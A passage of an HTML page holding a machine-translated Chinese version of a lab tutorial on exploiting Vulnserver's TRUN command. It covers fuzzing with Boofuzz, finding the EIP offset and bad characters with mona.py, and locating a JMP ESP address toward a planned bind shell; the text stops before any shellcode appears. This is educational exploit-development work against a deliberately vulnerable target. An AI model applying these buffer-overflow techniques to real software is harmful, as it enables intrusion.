<html>
<head>
<title>[ExpDev] Vulnserver — Part 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnserver —第2部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-vulnserver-part-2-46de4dd7bdde?source=collection_archive---------1-----------------------#2020-07-16">https://infosecwriteups.com/expdev-vulnserver-part-2-46de4dd7bdde?source=collection_archive---------1-----------------------#2020-07-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/3e0705ab58bb1eab36ba203a1d1d9cc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*VgvRlHVA8Pe9vyDU.png"/></div></figure><h1 id="9301" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">Vulnserver —第2部分(中继— EIP覆盖)</h1><p id="0643" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">这将是第二个<code class="fe lq lr ls lt b">vulnserver</code> exploit系列。我们将模糊和利用第一个易受攻击的命令<code class="fe lq lr ls lt b">TRUN</code>。然后，我们将做一个<code class="fe lq lr ls lt b">EIP</code>覆盖来引入我们的shell代码，最终在目标系统上获得一个bind shell。我们开始吧！</p><h1 id="3cf5" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">实验室环境</h1><ul class=""><li id="65d2" class="lu lv iq ku b kv kw kz la ld lw lh lx ll ly lp lz ma mb mc bi translated"><strong class="ku ir">操作系统:</strong> Windows 7 (x86)</li><li id="2e1a" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated"><strong class="ku ir">调试器:</strong> OllyDbg，WinDbg (mona.py)</li><li id="f367" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated"><strong class="ku ir">模糊器:</strong>模糊器</li><li id="331e" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated"><strong class="ku ir">目标:</strong> Vulnserver — TRUN命令</li></ul><p id="719d" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">详细的实验室设置指南可在<a class="ae mn" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-1-ba35b9e36478" rel="noopener">这里</a>找到:</p><ul class=""><li id="86c7" class="lu lv iq ku b kv mi kz mj ld mo lh mp ll mq lp lz ma mb mc bi translated">"第一部分"</li></ul></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h1 id="823e" class="ju jv iq bd jw jx my jz ka kb mz kd ke kf na kh ki kj nb kl km kn nc kp kq kr bi translated">初步侦察</h1><p id="32ca" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">在Windows 7的机器上运行Vulnserver后，我们可以使用<code class="fe lq lr ls lt b">netcat</code>连接服务器。</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="e189" class="nl jv iq lt b gy nm nn l no np">c:\&gt; ncat 127.0.0.1 9999</span></pre><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/208fe4ffe45fa12484072d0cc161dcd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*TzCdPa-7gL9SGaWvxHaI2w.png"/></div></figure></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h1 id="fba6" class="ju jv iq bd jw jx my jz ka kb mz kd ke kf na kh ki kj nb kl km kn nc kp kq kr bi translated">起毛</h1><h2 id="72bb" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">起毛简介</h2><p id="45c9" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">Boofuzz确实有一个非常好的快速入门指南，以及一些用户可以使用的预建示例脚本。</p><ul class=""><li id="c2e2" class="lu lv iq ku b kv mi kz mj ld mo lh mp ll mq lp lz ma mb mc bi translated"><strong class="ku ir">快速启动</strong>—<a class="ae mn" href="https://boofuzz.readthedocs.io/en/latest/user/quickstart.html" rel="noopener ugc nofollow" target="_blank">https://boofuzz . readthe docs . io/en/latest/user/quick start . html</a></li><li id="2859" class="lu lv iq ku b kv md kz me ld mf lh mg ll mh lp lz ma mb mc bi translated"><strong class="ku ir">例子</strong>——<a class="ae mn" href="https://github.com/jtpereyda/boofuzz/tree/master/examples" rel="noopener ugc nofollow" target="_blank">https://github.com/jtpereyda/boofuzz/tree/master/examples</a></li></ul><p id="5927" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">简而言之，Boofuzz的模糊化过程非常简单。以下示例是Boofuzz脚本的必要组件的快速参考:</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="0cb9" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### Session Object</strong><br/>session = Session(target=Target(connection=TCPSocketConnection("&lt;IP&gt;", &lt;PORT&gt;)))     </span><span id="d6a4" class="nl jv iq lt b gy oc nn l no np"><strong class="lt ir">### Message 's_initialize' Function</strong><br/>s_initialize("user")    <br/>s_string("USER")    <br/>s_delim(" ")    <br/>s_string("anonymous")    <br/>s_static("\r\n")     </span><span id="cbf8" class="nl jv iq lt b gy oc nn l no np"><strong class="lt ir">### Session Connect</strong><br/>session.connect(s_get("user"))    </span><span id="9eb9" class="nl jv iq lt b gy oc nn l no np"><strong class="lt ir">### Session Fuzz</strong><br/>session.fuzz()</span></pre></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="66cb" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">模糊脚本</h2><p id="a136" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">让我们创建一个初始的Boofuzz脚本来模糊化<code class="fe lq lr ls lt b">vulnserver</code>，具体来说，我们的目标是TRUN命令。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/19a1c6f3185a81d97ce108dbdc942dba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*kHfAWx0ttBUQsJerZjCEOQ.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">来源:<a class="ae mn" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/TRUN/fuzz_trun.py" rel="noopener ugc nofollow" target="_blank">fuzz _ trun . py by bigboss</a></figcaption></figure></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="2bfb" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">调试器设置(*附加vulnserver.exe)</h2><p id="e130" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">在运行Boofuzz脚本之前，让我们用OllyDbg附加<code class="fe lq lr ls lt b">vulnserver</code>。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/1e46bbe2891713e60ec5c404d8a8e345.png" data-original-src="https://miro.medium.com/v2/resize:fit:1154/format:webp/1*pwMs-qn9lVBlkpblJ_6Vdw.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">附加vulnserver</figcaption></figure><p id="f6a8" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">当<code class="fe lq lr ls lt b">vulnserver</code>连接到调试器时，让我们运行<code class="fe lq lr ls lt b">fuzz_trun.py</code>脚本，并观察调试器中的任何崩溃。</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="2fa2" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### Running the Fuzzer</strong><br/>C:\Users\bigb0ss\Desktop\scripts&gt;python fuzz_trun.py</span></pre><p id="7f89" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">运行我们的fuzzing脚本几秒钟后，<code class="fe lq lr ls lt b">vulnserver</code>崩溃，现在<code class="fe lq lr ls lt b">EIP</code>被fuzzer提供的字符覆盖。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi oj"><img src="../Images/453a323abf9d27685987ea38dbe57e77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5pO-2elA3wbWtQ6BQFSNuA.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">初始碰撞</figcaption></figure></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="3cd5" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">模糊分析</h2><p id="7075" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">Boofuzz的一个惊人之处是，它在fuzzing脚本所在的同一个目录中创建日志文件。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/72bd404904c4717b3007b53dfc0c3abb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1114/format:webp/1*TRK1cBA4n-bvfxpPu_RsxA.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">Boofuzz-results =日志文件</figcaption></figure><p id="acdf" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">当我们进入“boofuzz-results”文件夹时，我们将看到“DB File”格式的日志文件。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi op"><img src="../Images/7e82522f2635f0a7a783f3b6e4c328e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*nY9tO2vHwgmob4g4jdd8dg.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">模糊日志文件</figcaption></figure><p id="a518" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">我们可以使用“DB Browser for SQLite”来浏览和进一步分析这个文件一旦打开DB文件，将<code class="fe lq lr ls lt b">Table:</code>更改为<code class="fe lq lr ls lt b">steps</code>。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi oq"><img src="../Images/f73e0c87e5895854d74bdd641ed8316d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MtYbeZ6TU1ijx_x5pM_Cbw.png"/></div></div></figure><p id="8c8d" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">从上面的“初始崩溃”截图中，我们可以确定崩溃的发生是由于为TRUN命令的参数发送了太多的字符。现在，我们需要找出导致崩溃的字符数。为此，让我们在“数据库浏览器”中进行一些过滤</p><blockquote class="or os ot"><p id="b96e" class="ks kt ou ku b kv mi kx ky kz mj lb lc ov mk lf lg ow ml lj lk ox mm ln lo lp ij bi translated"><strong class="ku ir">过滤“中继…”在“数据”字段中</strong></p></blockquote><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi oy"><img src="../Images/2b8471f6675b392970ad8ad5df885bb0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N-5NyB5ANw2xMui6-saN1w.png"/></div></div></figure><p id="9049" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">不幸的是，在这种情况下，从过滤结果中产生了太多的“测试用例”。我们很难确定有多少字节导致了崩溃。我们在这里可以做的是返回到OllyDbg，粗略地计算发送了多少个字符(在这种情况下，查看<code class="fe lq lr ls lt b">EAX</code>寄存器，并计算有多少个<code class="fe lq lr ls lt b">2E</code>)。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi oz"><img src="../Images/fd8df4500b8f35d40eef230995ad3c50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/1*vL29RCPee8ZFi07KU_u4Xw.png"/></div></figure><p id="1f66" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">结果是大约3000个字符。通过再次查看“test_cases ”,发送的最接近的字节数是“test_case_index”的702。让我们在“数据库浏览器”中进行过滤</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pa"><img src="../Images/0c24e5d908f18e45819c1c1e144da9d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HuWzl4rZFsO0m0ZU-DHoaQ.png"/></div></div></figure><p id="6091" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">test_case 702发送了4099个字节，我们相信这足以使vulnserver崩溃。接下来，让我们创建一个利用脚本来复制崩溃，并进一步找到偏移量。</p></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h1 id="12d3" class="ju jv iq bd jw jx my jz ka kb mz kd ke kf na kh ki kj nb kl km kn nc kp kq kr bi translated">剥削</h1><h2 id="2685" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">初始崩溃概念验证</h2><p id="9752" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">让我们创建一个python脚本来重现崩溃。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/f269e93ba758317f7eab2bb146e42a57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1114/format:webp/1*He74xMCOfIXragvdyQrd9g.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">来源:<a class="ae mn" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/TRUN/crash_trun.py" rel="noopener ugc nofollow" target="_blank">crash _ trun . py by bigboss</a></figcaption></figure><p id="13f1" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">启动<code class="fe lq lr ls lt b">vulnserver</code>并将其连接到OllyDbg。然后，运行<code class="fe lq lr ls lt b">crash_trun.py</code>脚本。我们成功地用PoC脚本重现了崩溃。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pb"><img src="../Images/09841de470bf39b8f94b098053388c20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OPrbmYOkXzin3399lbXupg.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">再现车祸</figcaption></figure></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="5904" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">寻找偏移</h2><p id="a4e7" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">作为一个通常的<code class="fe lq lr ls lt b">EIP</code>覆盖漏洞利用过程，我们的下一步将是找到一个偏移量来控制崩溃时的<code class="fe lq lr ls lt b">EIP</code>。我们首先需要创建4099个独特的角色。我们将使用WinDbg和mona.py的<code class="fe lq lr ls lt b">pattern_create</code>模块来实现这一点。</p><p id="237b" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">打开WinDbg并附加一个begin进程(如“firefox.exe ”)来启动命令控制台。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pc"><img src="../Images/dec5f1f3358c39c55dc266c829eb2ece.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8uPaWvLUug8-YodqG2P6KQ.png"/></div></div></figure><p id="269a" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">然后，键入以下命令来创建模式。</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="4e4f" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### Loading Python Extension of WinDbg</strong><br/>.load pykd.pyd</span><span id="1b72" class="nl jv iq lt b gy oc nn l no np"><strong class="lt ir">### Mona.py Pattern_create</strong><br/>!py mona pattern_create 4099</span></pre><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pd"><img src="../Images/fc6b978e47b71703d979292be95a7131.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VgdOL99pKTYRgBJt-ALaqg.png"/></div></div></figure><p id="c913" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">让我们用创建的模式更新PoC脚本，并再次针对<code class="fe lq lr ls lt b">vulnserver</code>运行脚本。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pe"><img src="../Images/0bd5130b3a47cc42e58691492a4adeeb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lr3cdOhFoIfznTkgPi8KxA.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">更新的PoC脚本</figcaption></figure><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pf"><img src="../Images/a284edbea461eaaebf588a3776093754.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QC3n0JqA5ioiotc-puL7dw.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">尝试找到偏移量</figcaption></figure><p id="e5d5" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated"><code class="fe lq lr ls lt b">EIP</code>现在被值<code class="fe lq lr ls lt b">396F4338</code>覆盖。让我们再次使用mona.py来查找偏移量。这次，我们将使用名为<code class="fe lq lr ls lt b">pattern_offset</code>的模块。</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="47a5" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### Mona.py Pattern_offset</strong><br/>!py mona pattern_offset 396F4338</span></pre><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pg"><img src="../Images/260a0d3456972db487e4a45ec08427a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XEDHv2XOWsp9YXAAPcifAQ.png"/></div></div></figure><p id="df9a" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">太好了。它找到的偏移量为<code class="fe lq lr ls lt b">2006</code>。让我们再次更新我们的PoC脚本，并通过对<code class="fe lq lr ls lt b">vulnserver</code>运行它来确认偏移量。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/3d8fe1fbba3a61f73393c39f5113d872.png" data-original-src="https://miro.medium.com/v2/resize:fit:1082/format:webp/1*Tt98utKq5jasvB4AcQZ5Aw.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">来源:<a class="ae mn" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/TRUN/offset_trun.py" rel="noopener ugc nofollow" target="_blank">big b0ss偏移量_ trun . py</a></figcaption></figure><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pi"><img src="../Images/3d24501f353c27f3fdef1ab630de762a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RCyj0MonR5OHPEgPX61sBw.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">确认偏移量</figcaption></figure><p id="162b" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">偏移确实是正确的。现在，我们都准备在坠机时控制<code class="fe lq lr ls lt b">EIP</code>。</p></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="8a68" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">查找坏字符</h2><p id="b628" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">开发漏洞时，提前发现坏的角色总是一个好的做法。我们将使用mona.py的<code class="fe lq lr ls lt b">bytearray</code>命令创建一个从<code class="fe lq lr ls lt b">\x01</code>到<code class="fe lq lr ls lt b">\xFF</code>的字节列表。(<code class="fe lq lr ls lt b">\x00</code> =空终止符通常是一个坏字符，所以我们可以在生成带有<code class="fe lq lr ls lt b">-cpb</code>标志的列表时将其排除)</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="1ade" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### Mona.py Bytearray</strong><br/>!py mona.py bytearray -cpb \x00</span></pre><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pj"><img src="../Images/044d5a46b3a3752039cb21530b874fab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qDSI9Q3SOEpM98C4c8S1iA.png"/></div></div></figure><p id="f1fe" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">让我们用那些<code class="fe lq lr ls lt b">bytearray</code>更新我们的PoC脚本。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pk"><img src="../Images/06a16aded206bf7c73e8934f86b6ff1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3oBtUDIqYa5O8dR5fvKqQQ.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">来源:<a class="ae mn" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/TRUN/badchar_trun.py" rel="noopener ugc nofollow" target="_blank">big b0ss编写的bad char _ trun . py</a></figcaption></figure><p id="435d" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">然后，再次将<code class="fe lq lr ls lt b">vulnserver</code>连接到OllyDbg，并运行<code class="fe lq lr ls lt b">badchar_trun.py</code>脚本。当它崩溃时，检查<code class="fe lq lr ls lt b">ESP</code>位置，看是否有任何字节被损坏。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pl"><img src="../Images/fdf46faff0aa61ff5506286794b2f6b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2LJ79RIsJ5bLmCbb3OVvig.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">检查不良字符</figcaption></figure><p id="88e2" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">没有字节被损坏，我们擅长检查坏字符。</p></div><div class="ab cl mr ms hu mt" role="separator"><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw mx"/><span class="mu bw bk mv mw"/></div><div class="ij ik il im in"><h2 id="2980" class="nl jv iq bd jw nr ns dn ka nt nu dp ke ld nv nw ki lh nx ny km ll nz oa kq ob bi translated">寻找JMP-专门用途英语</h2><p id="f7d2" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">像往常一样<code class="fe lq lr ls lt b">EIP</code>覆盖BOF漏洞，我们现在需要找到一个<code class="fe lq lr ls lt b">JMP ESP</code>指令。然后，我们将在<code class="fe lq lr ls lt b">ESP</code>位置引入我们的外壳代码，并将执行流程重定向到那里来执行我们的外壳代码。</p><p id="8baa" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">这次让我们把vulnserver连接到WinDbg，这样我们就可以使用mona.py在应用程序的dll中找到<code class="fe lq lr ls lt b">JMP ESP</code>。我们将再次使用<code class="fe lq lr ls lt b">-cpb</code>标志来排除任何包含<code class="fe lq lr ls lt b">\x00</code>的地址。(默认情况下，它还在非ASLR或非Rebase模块中搜索。)</p><pre class="nd ne nf ng gt nh lt ni nj aw nk bi"><span id="c0cd" class="nl jv iq lt b gy nm nn l no np"><strong class="lt ir">### Loading Python Extension of WinDbg</strong><br/>.load pykd.pyd</span><span id="f3d7" class="nl jv iq lt b gy oc nn l no np"><strong class="lt ir">### Mona.py Finding JMP ESP</strong><br/>!py mona jmp -r esp -cpb '\x00'</span></pre><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pm"><img src="../Images/5d04ef91ac52381c38eb278158d568eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vMcAidmKgJs5hR4b418KWQ.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">寻找JMP专门用途英语</figcaption></figure><p id="0894" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">让我们使用其中一个地址<code class="fe lq lr ls lt b">0x62501205</code>，并更新我们的PoC脚本。再次将vulnserver连接到OllyDbg，并在<code class="fe lq lr ls lt b">0x62501205</code> ( <code class="fe lq lr ls lt b">JMP ESP</code>)地址设置一个断点。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div class="gh gi pn"><img src="../Images/4aec11597748ec44b357a7ed7b9213a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:942/format:webp/1*BM8n847chqZneQnLKhqgZg.png"/></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">断点</figcaption></figure><p id="84a9" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">当我们运行PoC脚本时，我们确实找到了<code class="fe lq lr ls lt b">JMP ESP</code>地址和断点。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi po"><img src="../Images/a63a6feacd600822f567d890308eab26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I59mZavKcBbTvKD09T3T9A.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">来源:<a class="ae mn" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/TRUN/jmp_esp_trun.py" rel="noopener ugc nofollow" target="_blank">jmp _ esp _ trun . py by bigboss</a></figcaption></figure><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ok ol di om bf on"><div class="gh gi pp"><img src="../Images/23bd7c5d7b762f7b4f20807cf3d24401.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-I4s0OAqfu6mrqxxJdKDbQ.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated">JMP ESP (0x <code class="fe lq lr ls lt b">62501205)</code></figcaption></figure><p id="de11" class="pw-post-body-paragraph ks kt iq ku b kv mi kx ky kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp ij bi translated">当我们按下<code class="fe lq lr ls lt b">F7</code>来单步执行指令时，我们成功地跳到了<code class="fe lq lr ls lt b">ESP</code>，我们拥有了所有可以放置外壳代码的空闲空间。</p><figure class="nd ne nf ng gt jr gh gi paragraph-image"><div role="button" tabindex="0" 